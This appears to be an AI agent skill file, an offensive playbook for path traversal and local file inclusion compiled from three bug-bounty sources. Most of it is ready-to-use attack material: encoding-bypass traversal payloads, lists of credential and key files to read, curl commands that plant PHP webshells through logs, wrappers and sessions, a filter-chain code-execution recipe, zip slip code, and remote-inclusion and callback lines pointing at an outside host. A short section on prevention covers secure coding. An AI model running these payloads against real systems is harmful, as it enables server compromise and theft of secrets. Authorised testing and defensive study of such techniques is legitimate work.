---
name: path-traversal-lfi
description: Path traversal and LFI playbook — encoding variants (../,  %2e%2e%2f, 0x2e0x2e0x2f, URL double-encoding), LFI to RCE (log poisoning, /proc/self/fd, PHP wrappers, session files), LFI to SSRF via php://input, Windows-specific paths, and directory traversal in zip/tar archives.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Path Traversal & LFI — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Path traversal lets attackers read (and sometimes write/include) files outside the intended directory. LFI extends this to include and execute PHP files. Covers all major encoding bypasses, LFI to RCE escalation paths (log poisoning, PHP wrappers, /proc/self/fd), and archive traversal (zip slip). Base models miss the PHP wrapper chain (convert.iconv + filter) for no-file-write RCE.

## 0. RELATED ROUTING

- upload-insecure-files — upload file then include via LFI → RCE
- cmdi-command-injection — if traversal reaches shell config files
- ghost-bits-cast-attack — Java path traversal bypass via high-bit truncation

---

## 1. BASIC TRAVERSAL PAYLOADS

```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd
..././..././..././etc/passwd
```

---

## 2. ENCODING BYPASS VARIANTS

### 2.1 Standard URL Encoding

```
..%2F../etc/passwd       # %2F = /
%2e%2e%2f%2e%2e%2fetc%2fpasswd  # %2e=. %2f=/
```

### 2.2 Double URL Encoding

```
..%252F..%252Fetc%252Fpasswd    # %25 = % → decoded twice: %2F → /
%252e%252e%252f                 # Double encoded .../
```

### 2.3 Unicode / UTF-8 Encoding

```
..%c0%af../etc/passwd     # Overlong UTF-8 for /
..%c1%9c../etc/passwd     # Another overlong variant
..%ef%bc%8f../etc/passwd  # Fullwidth solidus (/)
..%e0%80%af..             # 3-byte overlong encoding
```

### 2.4 Filter Bypass (Stripping ../)

When app strips `../`:

```
....//....//etc/passwd     # After stripping ../ → ../../etc/passwd
..././..././etc/passwd     # After stripping ../ → ../../etc/passwd
....\\ (Windows)
```

### 2.5 Null Byte Bypass (PHP < 5.3.4)

```
../../../etc/passwd%00
../../../etc/passwd%00.jpg   # Null byte truncates .jpg extension check
```

### 2.6 Path Normalization Tricks

```
/etc/./passwd             # /. = current dir = /etc/passwd
/etc//passwd              # Double slash
/etc/passwd.              # Trailing dot (Windows ignores)
/etc/passwd::$DATA        # Windows ADS
```

---

## 3. LFI TARGET FILES (LINUX)

```bash
# System information
/etc/passwd                     # Users
/etc/shadow                     # Password hashes (if readable)
/etc/hostname                   # Hostname
/etc/hosts                      # Hosts file
/etc/issue                      # OS version
/proc/version                   # Kernel version

# Web server config
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/usr/local/apache2/conf/httpd.conf

# Application secrets
/var/www/html/config.php
/var/www/html/.env
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa
/root/.bash_history

# PHP session files (for session-based RCE)
/var/lib/php/sessions/sess_SESSION_ID
/tmp/sess_SESSION_ID

# Log files (for log poisoning)
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/proc/self/fd/X (1=stdout, 2=stderr, 7=nginx stderr)
```

---

## 4. LFI TO RCE — LOG POISONING

```
1. Inject PHP code into log via User-Agent:
   User-Agent: <?php system($_GET['cmd']); ?>

2. Access log file via LFI:
   ?file=../../../var/log/apache2/access.log&cmd=id
```

**Nginx access.log**:
```
# Inject via URL path (URL-decoded into log):
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
# Then: ?file=../../../var/log/nginx/access.log&cmd=id
```

---

## 5. LFI TO RCE — /PROC/SELF/FD

Linux `/proc/self/fd/` contains file descriptors open by the current process:

```bash
# Find which fd contains error log / access log:
for i in $(seq 0 50); do
  curl "http://target/vuln.php?file=/proc/self/fd/$i" 2>&1
done

# Common: fd/2 = stderr, fd/7 = error log in some configs
# After finding the right fd, inject PHP into it and include
```

---

## 6. PHP WRAPPERS FOR LFI

```php
# Read files as base64 (bypass security checks):
?file=php://filter/convert.base64-encode/resource=/etc/passwd
# Decode result: base64 -d output

# Read files with encoding chains:
?file=php://filter/read=string.rot13/resource=/etc/passwd

# PHP execution from stdin:
?file=php://input
# POST body: <?php system('id'); ?>

# Data wrapper (run inline PHP):
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# Decoded: <?php system('id'); ?>

# Zip wrapper (if zip upload possible):
?file=zip://uploads/shell.zip%23shell.php
```

### PHP Filter Chain (No File Write RCE)

A chain of filter conversions can generate arbitrary PHP content without writing a file:

```bash
# Tool: php_filter_chain_generator
# https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
# Outputs a php://filter chain that, when included, decodes to PHP code

# Example output (truncated):
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...&cmd=id
```

---

## 7. PHP SESSION FILE INCLUSION

```bash
# 1. Find PHP session cookie: PHPSESSID=abc123
# 2. Set session variable to PHP code via controllable session field:
#    username=<?php system($_GET['cmd']); ?>
# 3. Include session file:
?file=/var/lib/php/sessions/sess_abc123&cmd=id
```

---

## 8. WINDOWS-SPECIFIC PATHS

```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\W3SVC1\*.log
C:\Windows\Temp\php*
C:\Users\Administrator\Desktop\flag.txt
C:\xampp\htdocs\*.php
C:\wamp\www\*.php
C:\ProgramData\MySQL\MySQL Server\data\*.ibd
```

---

## 9. ZIP SLIP (ARCHIVE TRAVERSAL)

Malicious zip/tar containing path traversal in filename:

```python
import zipfile

# Create zip with traversal path:
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.write('shell.php', '../../../../var/www/html/shell.php')

# When server extracts evil.zip without sanitizing paths,
# shell.php lands in webroot
```

**Tools**:
```bash
# evilarc: create malicious archives
evilarc.py --os linux -p 5 shell.php
# Creates zip with ../../../../../../../../shell.php path
```

---

## 10. TESTING CHECKLIST

```
□ Identify file parameter: ?file=, ?path=, ?template=, ?page=, ?load=, ?doc=
□ Test: ?file=../../../etc/passwd (look for root: in response)
□ Test encoding variants if basic traversal is filtered
□ Test null byte if PHP < 5.3.4
□ Test /proc/self/environ (may contain HTTP headers with injected PHP)
□ Test PHP wrappers: php://filter, php://input, data://
□ Check for log poisoning via User-Agent injection
□ Check for zip/archive upload → zip slip extraction
□ Check if /proc/self/fd/ accessible → find log fd
□ For PHP apps: test php_filter_chain for no-write RCE
□ Enumerate session files via /var/lib/php/sessions/sess_SESSIONID
```


---

## [File Path Traversal Testing (zebbern)] Additional Techniques

# File Path Traversal Testing

## Purpose

Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- cURL for testing payloads
- Wordlists for automation
- ffuf or wfuzz for fuzzing

### Required Knowledge
- HTTP request/response structure
- Linux and Windows filesystem layout
- Web application architecture
- Basic understanding of file APIs

## Outputs and Deliverables

1. **Vulnerability Report** - Identified traversal points and severity
2. **Exploitation Proof** - Extracted file contents
3. **Impact Assessment** - Accessible files and data exposure
4. **Remediation Guidance** - Secure coding recommendations

## Core Workflow

### Phase 1: Understanding Path Traversal

Path traversal occurs when applications use user input to construct file paths:

```php
// Vulnerable PHP code example
$template = "blue.php";
if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
    $template = $_COOKIE['template'];
}
include("/home/user/templates/" . $template);
```

Attack principle:
- `../` sequence moves up one directory
- Chain multiple sequences to reach root
- Access files outside intended directory

Impact:
- **Confidentiality** - Read sensitive files
- **Integrity** - Write/modify files (in some cases)
- **Availability** - Delete files (in some cases)
- **Code Execution** - If combined with file upload or log poisoning

### Phase 2: Identifying Traversal Points

Map application for potential file operations:

```bash
# Parameters that often handle files
?file=
?path=
?page=
?template=
?filename=
?doc=
?document=
?folder=
?dir=
?include=
?src=
?source=
?content=
?view=
?download=
?load=
?read=
?retrieve=
```

Common vulnerable functionality:
- Image loading: `/image?filename=23.jpg`
- Template selection: `?template=blue.php`
- File downloads: `/download?file=report.pdf`
- Document viewers: `/view?doc=manual.pdf`
- Include mechanisms: `?page=about`

### Phase 3: Basic Exploitation Techniques

#### Simple Path Traversal

```bash
# Basic Linux traversal
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Windows traversal
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding

# Test payloads with curl
curl "http://target.com/image?filename=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/passwd"
```

#### Absolute Path Injection

```bash
# Direct absolute path (Linux)
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ

# Direct absolute path (Windows)
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
```

### Phase 4: Bypass Techniques

#### Bypass Stripped Traversal Sequences

```bash
# When ../ is stripped once
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# Nested traversal
..././..././..././etc/passwd
....//....//etc/passwd

# Mixed encoding
..%2f..%2f..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Bypass Extension Validation

```bash
# Null byte injection (older PHP versions)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Path truncation
../../../etc/passwd...............................

# Double extension
../../../etc/passwd.jpg.php
```

#### Bypass Base Directory Validation

```bash
# When path must start with expected directory
/var/www/images/../../../etc/passwd

# Expected path followed by traversal
images/../../../etc/passwd
```

#### Bypass Blacklist Filters

```bash
# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# Overlong UTF-8 encoding
%c0%2e%c0%2e%c0%af

# URL encoding variations
%2e%2e/
%2e%2e%5c
..%5c
..%255c

# Case variations (Windows)
....\\....\\etc\\passwd
```

### Phase 5: Linux Target Files

High-value files to target:

```bash
# System files
/etc/passwd           # User accounts
/etc/shadow           # Password hashes (root only)
/etc/group            # Group information
/etc/hosts            # Host mappings
/etc/hostname         # System hostname
/etc/issue            # System banner

# SSH files
/root/.ssh/id_rsa           # Root private key
/root/.ssh/authorized_keys  # Authorized keys
/home/<user>/.ssh/id_rsa    # User private keys
/etc/ssh/sshd_config        # SSH configuration

# Web server files
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log

# Application files
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/var/www/html/web.config

# Process information
/proc/self/environ      # Environment variables
/proc/self/cmdline      # Process command line
/proc/self/fd/0         # File descriptors
/proc/version           # Kernel version

# Common application configs
/etc/mysql/my.cnf
/etc/postgresql/*/postgresql.conf
/opt/lampp/etc/httpd.conf
```

### Phase 6: Windows Target Files

Windows-specific targets:

```bash
# System files
C:\windows\win.ini
C:\windows\system.ini
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\SAM
C:\windows\repair\SAM

# IIS files
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\

# Configuration files
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\passwords.txt
C:\xampp\phpmyadmin\config.inc.php

# User files
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\Desktop\
C:\Documents and Settings\<user>\
```

### Phase 7: Automated Testing

#### Using Burp Suite

```
1. Capture request with file parameter
2. Send to Intruder
3. Mark file parameter value as payload position
4. Load path traversal wordlist
5. Start attack
6. Filter responses by size/content for success
```

#### Using ffuf

```bash
# Basic traversal fuzzing
ffuf -u "http://target.com/image?filename=FUZZ" \
     -w /usr/share/wordlists/traversal.txt \
     -mc 200

# Fuzzing with encoding
ffuf -u "http://target.com/page?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -mc 200,500 -ac
```

#### Using wfuzz

```bash
# Traverse to /etc/passwd
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      --hc 404 \
      "http://target.com/index.php?file=FUZZ"

# With headers/cookies
wfuzz -c -z file,traversal.txt \
      -H "Cookie: session=abc123" \
      "http://target.com/load?path=FUZZ"
```

### Phase 8: LFI to RCE Escalation

#### Log Poisoning

```bash
# Inject PHP code into logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Include Apache log file
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# Include auth.log (SSH)
# First: ssh '<?php system($_GET["cmd"]); ?>'@target.com
curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
```

#### Proc/self/environ

```bash
# Inject via User-Agent
curl -A "<?php system('id'); ?>" \
     "http://target.com/page?file=/proc/self/environ"

# With command parameter
curl -A "<?php system(\$_GET['c']); ?>" \
     "http://target.com/page?file=/proc/self/environ&c=whoami"
```

#### PHP Wrapper Exploitation

```bash
# php://filter - Read source code as base64
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# php://input - Execute POST data as PHP
curl -X POST -d "<?php system('id'); ?>" \
     "http://target.com/page?file=php://input"

# data:// - Execute inline PHP
curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"

# expect:// - Execute system commands
curl "http://target.com/page?file=expect://id"
```

### Phase 9: Testing Methodology

Structured testing approach:

```bash
# Step 1: Identify potential parameters
# Look for file-related functionality

# Step 2: Test basic traversal
../../../etc/passwd

# Step 3: Test encoding variations
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Step 4: Test bypass techniques
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Step 5: Test absolute paths
/etc/passwd

# Step 6: Test with null bytes (legacy)
../../../etc/passwd%00.jpg

# Step 7: Attempt wrapper exploitation
php://filter/convert.base64-encode/resource=index.php

# Step 8: Attempt log poisoning for RCE
```

### Phase 10: Prevention Measures

Secure coding practices:

```php
// PHP: Use basename() to strip paths
$filename = basename($_GET['file']);
$path = "/var/www/files/" . $filename;

// PHP: Validate against whitelist
$allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
if (in_array($_GET['file'], $allowed)) {
    include("/var/www/files/" . $_GET['file']);
}

// PHP: Canonicalize and verify base path
$base = "/var/www/files/";
$realBase = realpath($base);
$userPath = $base . $_GET['file'];
$realUserPath = realpath($userPath);

if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
    include($realUserPath);
}
```

```python
# Python: Use os.path.realpath() and validate
import os

def safe_file_access(base_dir, filename):
    # Resolve to absolute path
    base = os.path.realpath(base_dir)
    file_path = os.path.realpath(os.path.join(base, filename))
    
    # Verify file is within base directory
    if file_path.startswith(base):
        return open(file_path, 'r').read()
    else:
        raise Exception("Access denied")
```

## Quick Reference

### Common Payloads

| Payload | Target |
|---------|--------|
| `../../../etc/passwd` | Linux password file |
| `..\..\..\..\windows\win.ini` | Windows INI file |
| `....//....//....//etc/passwd` | Bypass simple filter |
| `/etc/passwd` | Absolute path |
| `php://filter/convert.base64-encode/resource=config.php` | Source code |

### Target Files

| OS | File | Purpose |
|----|------|---------|
| Linux | `/etc/passwd` | User accounts |
| Linux | `/etc/shadow` | Password hashes |
| Linux | `/proc/self/environ` | Environment vars |
| Windows | `C:\windows\win.ini` | System config |
| Windows | `C:\boot.ini` | Boot config |
| Web | `wp-config.php` | WordPress DB creds |

### Encoding Variants

| Type | Example |
|------|---------|
| URL Encoding | `%2e%2e%2f` = `../` |
| Double Encoding | `%252e%252e%252f` = `../` |
| Unicode | `%c0%af` = `/` |
| Null Byte | `%00` |

## Constraints and Limitations

### Permission Restrictions
- Cannot read files application user cannot access
- Shadow file requires root privileges
- Many files have restrictive permissions

### Application Restrictions
- Extension validation may limit file types
- Base path validation may restrict scope
- WAF may block common payloads

### Testing Considerations
- Respect authorized scope
- Avoid accessing genuinely sensitive data
- Document all successful access

## Troubleshooting

| Problem | Solutions |
|---------|-----------|
| No response difference | Try encoding, blind traversal, different files |
| Payload blocked | Use encoding variants, nested sequences, case variations |
| Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |


---

## Hunt Methodology (Claude-BugHunter — real BB reports)

# HUNT-LFI — Local / Remote File Inclusion & Path Traversal

## Crown Jewel Targets

LFI that reaches code execution is Critical. Pure file-read is High when it exposes secrets (`.env`, `wp-config.php`, private keys, cloud creds), Medium when it only reads non-sensitive files.

**Highest-value chains (in rough order of reliability in 2026):**
- **PHP filter-chain → RCE** — the modern default. A bare `php://filter` *file-read* primitive is upgraded to RCE with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. This is the single most impactful thing to try and the most-missed.
- **Log poisoning → RCE** — inject PHP into an Apache/Nginx log (User-Agent / URL path), then include the log. Increasingly blocked by `open_basedir` and unreadable log perms, so verify the log is *readable* first.
- **PHP wrappers → source disclosure** — `php://filter/convert.base64-encode/resource=index.php` leaks source; read source to find more LFI sinks, secrets, and the include base path.
- **RFI → RCE** — when `allow_url_include=On`, `?file=http://OOB/shell.txt` pulls and executes remote code. Rare on modern configs but trivially Critical when present.
- **phar:// deserialization** — a crafted PHAR + any unserialize-on-metadata sink → object-injection RCE.
- **zip:// / data:// chains** and **session/upload poisoning** when filters block wrappers.

---

## OOB / Blind-LFI Confirmation Gate (Read First)

LFI is frequently **blind**: the included content is parsed/executed but never reflected, or the page swallows the file into a template you can't see. Do **not** claim LFI from indirect signals alone.

### What is NOT confirmation
- A different status code or error string for `../../etc/passwd` vs a normal value. The app may be string-matching `../` and returning a canned 403/500 without ever touching the filesystem.
- Your input **echoed back** inside an error message (e.g. `failed to open '/var/www/../../etc/passwd'`). That is the path *formatter*, not proof the file was read. A genuine read shows file **contents**, not your path.
- A page that "looks different." Reflected-input or WAF block pages produce diffs unrelated to a real read.

### What IS confirmation
- **Direct read:** actual file *contents* appear (real `root:x:0:0:` line, real PHP source after base64-decoding the filter output).
- **Blind read via OOB exfil:** use a php://filter or XXE-style chain whose payload performs a DNS/HTTP callback to your **Burp Collaborator** subdomain, or use an `expect://` / wrapper that triggers an outbound request. A unique-per-sink Collaborator hit (DNS + HTTP, with the server's source IP) proves the include ran.
- **Blind read via differential/timing:** include a file you *know* exists and is large (`/etc/passwd`) vs one that does not (`/etc/passwd_nope_<rand>`). Stable, repeatable response-length or latency delta = real filesystem access. Confirm with a third known-good path to rule out coincidence.

### Default workflow
1. Pick a **unique marker** target: prefer a file whose content you can fingerprint exactly (`/etc/passwd` → grep `^root:`). For blind, use a php://filter base64 read and decode — partial/truncated base64 still decodes to recognizable source.
2. Generate a sub-tagged Collaborator payload per sink (`lfi-page.<collab>`, `lfi-tpl.<collab>`) so callbacks identify which parameter fired.
3. Send, wait 30–120s, poll OOB.
4. Claim LFI **only** after a content match, a Collaborator callback, or a stable triple-confirmed timing/length delta. Echoed paths and lone status-code changes are retracted.

---

## Attack Surface Signals

### URL / Body Parameters
```
?page=  ?file=  ?path=  ?template=  ?view=  ?lang=  ?module=
?include=  ?doc=  ?load=  ?read=  ?content=  ?theme=  ?layout=
?component=  ?download=  ?img=  ?pdf=  ?report=  ?style=  ?dir=
JSON bodies: {"filename":...} {"template":...} {"path":...}
```

### Technology Stack Signals
| Signal | Vector |
|--------|--------|
| PHP (`X-Powered-By`, `.php`, PHPSESSID) | php:// filter-chain RCE, phar://, zip://, data:// |
| Apache/Nginx logs readable | Log poisoning → RCE (verify readability first) |
| Apache 2.4.49 / 2.4.50 (`Server:` banner) | CVE-2021-41773 / CVE-2021-42013 traversal → RCE |
| PHP-CGI on Windows (XAMPP, `php-cgi.exe`) | CVE-2024-4577 arg-injection → RCE |
| Java servlet (`/WEB-INF/`) | `WEB-INF/web.xml`, `classes/`, `application.properties` |
| Python Flask/Django | `/proc/self/environ`, `settings.py`, `SECRET_KEY` |
| Node.js file-serve / `res.sendFile`, `express.static` | path-traversal read, `require()` traversal |
| Windows IIS / .NET | `..\..\web.config`, `C:\Windows\win.ini`, machineKey |

---

## Step-by-Step Methodology

### Phase 1 — Identify Candidates
```bash
cat recon/$TARGET/urls.txt | gf lfi > recon/$TARGET/lfi-candidates.txt
grep -E "(\?|&)(page|file|path|template|view|lang|module|include|doc|load|read|content|download|img|pdf|report|dir)=" \
  recon/$TARGET/urls.txt
ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
```

### Phase 2 — Path Traversal (read)
```bash
?file=../../../etc/passwd
?file=....//....//....//etc/passwd            # ../ stripping once → ....// survives
?file=..%2f..%2f..%2fetc%2fpasswd             # single URL-encode
?file=..%252f..%252f..%252fetc%252fpasswd     # double encode (decoded twice server-side)
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd          # encode dots too
?file=/etc/passwd%00.png                      # null byte — PHP < 5.3.4 only
?file=....\/....\/etc\/passwd                  # mixed slash
# Prefix-forced base (app prepends /var/www/): pad with extra ../, or absolute path if no prefix
# UTF-8 overlong: %c0%ae%c0%ae%2f  (legacy servers)
```
```bash
# Windows
?file=..\..\..\windows\win.ini
?file=..%5c..%5c..%5cwindows%5cwin.ini
?file=C:\inetpub\wwwroot\web.config
```

### Phase 3 — PHP Wrappers (source disclosure)
```bash
?file=php://filter/convert.base64-encode/resource=index.php   # decode base64 → source
?file=php://filter/read=string.rot13/resource=config.php
?file=php://filter/convert.base64-encode/resource=../app/Config.php
# Always base64-encode source reads: raw <?php ... ?> is parsed/swallowed and you see nothing.
```

### Phase 4 — PHP Filter-Chain → RCE (no upload, no writable file)
The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**

```bash
# Generate the chain (public tool, no CVE — it abuses documented iconv behaviour):
#   git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Tool prints a long php://filter|convert.iconv.*|...|resource=php://temp string.
# Drop it into the sink:
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<long-chain>...|convert.base64-decode/resource=php://temp&c=id
```
Notes / gotchas:
- Requires the include sink to accept the `php://filter` scheme (most LFI sinks calling `include`/`require`/`file_get_contents` on the param do).
- Payloads get **long** (10–50KB). If the param is length-capped or WAF-blocked on size, move it to a POST body, or use a minimal payload (`<?=`shorthand`?>`).
- For blind targets, set the chain payload to a Collaborator callback (`<?php file_get_contents("http://x.<collab>/".`id`);?>`) to confirm execution OOB.
- This works even when log poisoning fails (unreadable logs, `open_basedir`). Try it whenever you have a php:// filter read.

### Phase 5 — Code-Execution Wrappers (config prerequisites)
```bash
# data:// — executes inline; REQUIRES allow_url_include=On
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   # <?php system($_GET['c']);?>

# php://input — body is treated as the included resource; ALSO REQUIRES allow_url_include=On
#   POST ?file=php://input    body: <?php system($_GET['c']); ?>
#   (Same prerequisite as data://. Do NOT assume this works on default PHP config.)

# expect:// — direct command exec; requires the (rare) expect extension loaded
?file=expect://id
```

### Phase 6 — Remote File Inclusion (RFI)
RFI = the include target is a **remote URL**. Prerequisite: `allow_url_include=On` (and `allow_url_fopen=On`). Off by default on modern PHP, but still seen on legacy/misconfigured hosts.
```bash
# Host a payload you control, then:
?file=http://OOB-HOST/shell.txt          # shell.txt contains <?php system($_GET['c']); ?>
?file=https://OOB-HOST/shell.txt?
?file=ftp://OOB-HOST/shell.txt
# Detection without RCE: point at a Burp Collaborator HTTP URL. A callback (server IP) = the
# include fetched remotely → RFI confirmed even if execution is blocked. No callback = not RFI.
# Bypass appended extension (?file=$x.".php"): trailing ? or # to truncate, or ?file=http://OOB/shell
```

### Phase 7 — Log Poisoning → RCE
```bash
# Step 1: inject PHP into a log the include can read
curl -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
# Step 2: include it (verify the log is readable first — read it plain before poisoning)
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/nginx/access.log&c=id
?file=/proc/self/fd/0&c=id                  # stdin fd (varies)
# Candidate logs: /var/log/apache2/access.log /var/log/httpd/access_log
#   /var/log/nginx/access.log /var/log/auth.log (SSH user poisoning) /proc/self/environ
```

### Phase 8 — Session / Upload Poisoning
```bash
# PHP session: set payload in a stored field (username/profile), then include the session file
?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id
?file=/tmp/sess_<PHPSESSID>&c=id
# phar:// object injection (needs an unserialize-on-metadata sink + any file upload):
?file=phar:///var/www/uploads/evil.jpg     # JPEG magic bytes prepended to a PHAR
# zip:// — archive containing the target, or a symlink to /etc/passwd
?file=zip:///var/www/uploads/a.zip%23path/inside.txt
```

### Phase 8b — Archive-extraction & image-processing sinks (no `?file=` needed)
Two LFI/traversal surfaces that are not query-parameter file reads:
- **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../../../etc/cron.d/x`, or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the upload dir. Disclosed: reports/1439593, reports/733072, reports/822262.
- **ImageMagick coder read-sink** — image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `hunt-file-upload`.

### Phase 9 — Automation (then manual-confirm everything)
```bash
ffuf -u "https://$TARGET/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt --hh <baseline-len> \
  "https://$TARGET/page.php?file=FUZZ"
dotdotpwn -m http -h $TARGET -o unix
# Burp: Intruder over the bypass table; Collaborator for blind/RFI confirmation.
```

---

## Named CVEs / Public Techniques (grounding)

Verified, correctly-attributed references for the patterns above:
- **PHP filter-chain to RCE** — Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. The reason a bare file-read upgrades to Critical.
- **CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.
- **CVE-2021-42013** — Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.
- **CVE-2024-4577** — PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.

> Grounding note: this skill is built from 31 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used — do **not** paraphrase a report ID from memory. A wrong ID is worse than none.

---

## Sensitive Files to Read
```
# Linux
/etc/passwd  /etc/hosts  /etc/shadow (rarely readable)
/proc/self/environ  /proc/self/cmdline  /proc/self/status
/var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
/home/*/.ssh/id_rsa  /root/.ssh/id_rsa  /root/.bash_history
/var/www/html/app/config/parameters.yml   # Symfony
.git/config  .git/HEAD  composer.json  package.json
# App / cloud secrets
/proc/self/environ  ~/.aws/credentials  ~/.docker/config.json  /run/secrets/*
# Windows / .NET
C:\Windows\win.ini  C:\inetpub\wwwroot\web.config  ..\..\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
```

---

## Bypass Table

| Filter | Bypass |
|--------|--------|
| Strips `../` once | `....//` or `..../\` (re-forms `../` after strip) |
| URL-decodes once | `%252f` (double-encode `/`), `%252e` for dots |
| Decodes once, blocks `..` | Encode dots: `%2e%2e%2f` / overlong `%c0%ae` (legacy) |
| Appends `.php` to input | `?` or `#` truncation; null byte `%00` (PHP < 5.3.4) |
| Blocks `php://` scheme | try `PHP://`, `pHp://`, or `data://` / `expect://` |
| Prepends fixed base dir | enough `../` to escape; or absolute path if no base prepend |
| Blocks `/etc/passwd` literal | path-truncation, `/etc/./passwd`, `/etc//passwd` |
| WAF on long filter-chains | move chain to POST body / minimize payload |
| Windows | `..\..\..\windows\win.ini`, `..%5c..%5c` |

---

## Chain Table

| LFI primitive | Chain to | Impact |
|---------------|----------|--------|
| `php://filter` read | **filter-chain RCE (Phase 4)** | RCE with no upload — **Critical** |
| File read | `.env` / `config.php` / `wp-config.php` | DB creds, API keys → backend takeover |
| File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |
| Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
| File read + upload | phar:// / log / session poison | RCE — **Critical** |
| Source disclosure | full app source | hardcoded secrets, new sinks, machineKey |

---

## Validation Discipline

**Direct-read proof (not a false positive):**
- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
